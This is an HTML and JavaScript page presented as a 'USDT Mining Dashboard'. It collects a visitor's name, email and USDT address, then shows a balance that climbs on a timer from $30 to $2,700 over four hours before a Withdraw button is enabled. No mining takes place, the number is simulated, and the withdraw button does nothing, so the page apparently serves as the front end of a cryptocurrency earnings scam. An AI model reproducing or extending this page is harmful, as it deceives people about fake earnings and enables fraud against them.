<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Mining Dashboard</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0b0f1a;
      color: #fff;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      padding: 20px;
      background-color: #131722;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.05);
    }

    h2 {
      text-align: center;
      color: #f0b90b;
    }

    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      font-size: 1em;
    }

    input, select {
      background-color: #1e2633;
      color: #fff;
    }

    button {
      background-color: #f0b90b;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }

    button:disabled {
      background-color: #999;
      cursor: not-allowed;
    }

    .balance {
      font-size: 2em;
      text-align: center;
      margin: 20px 0;
      color: #00ffcc;
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="registration">
    <h2>Register</h2>
    <select id="country">
      <option value="">Select Country</option>
      <option value="USA">USA</option>
      <option value="UK">UK</option>
      <option value="Nigeria">Nigeria</option>
      <!-- Add more countries -->
    </select>
    <input type="text" id="name" placeholder="Full Name" />
    <input type="text" id="usdt" placeholder="USDT Address" />
    <input type="email" id="email" placeholder="Email Address" />
    <button onclick="register()">Submit</button>
  </div>

  <div class="container hidden" id="dashboard">
    <h2>Mining Dashboard</h2>
    <div class="balance" id="balance">$30.00 USDT</div>
    <button id="startBtn" onclick="startMining()">Start Mining</button>
    <button id="withdrawBtn" disabled>Withdraw</button>
  </div>

  <script>
    const registrationDiv = document.getElementById('registration');
    const dashboardDiv = document.getElementById('dashboard');
    const balanceDisplay = document.getElementById('balance');
    const withdrawBtn = document.getElementById('withdrawBtn');

    let balance = 30;
    let miningStarted = false;
    let startTime;

    // Check if user is already registered
    if (localStorage.getItem('registered')) {
      registrationDiv.classList.add('hidden');
      dashboardDiv.classList.remove('hidden');
      balance = parseFloat(localStorage.getItem('balance')) || 30;
      updateBalance();
    }

    function register() {
      const country = document.getElementById('country').value;
      const name = document.getElementById('name').value;
      const usdt = document.getElementById('usdt').value;
      const email = document.getElementById('email').value;

      if (!country || !name || !usdt || !email) {
        alert("Please fill all fields.");
        return;
      }

      localStorage.setItem('registered', true);
      localStorage.setItem('balance', '30');
      registrationDiv.classList.add('hidden');
      dashboardDiv.classList.remove('hidden');
    }

    function startMining() {
      if (miningStarted) return;
      miningStarted = true;
      startTime = Date.now();
      document.getElementById('startBtn').disabled = true;

      const duration = 4 * 60 * 60 * 1000; // 4 hours in ms
      const target = 2700;
      const interval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        if (elapsed >= duration) {
          balance = target;
          clearInterval(interval);
          withdrawBtn.disabled = false;
        } else {
          const progress = elapsed / duration;
          balance = 30 + (target - 30) * progress;
        }
        updateBalance();
        localStorage.setItem('balance', balance.toFixed(2));
      }, 1000);
    }

    function updateBalance() {
      balanceDisplay.textContent = `$${balance.toFixed(2)} USDT`;
    }
  </script>
</body>
</html>
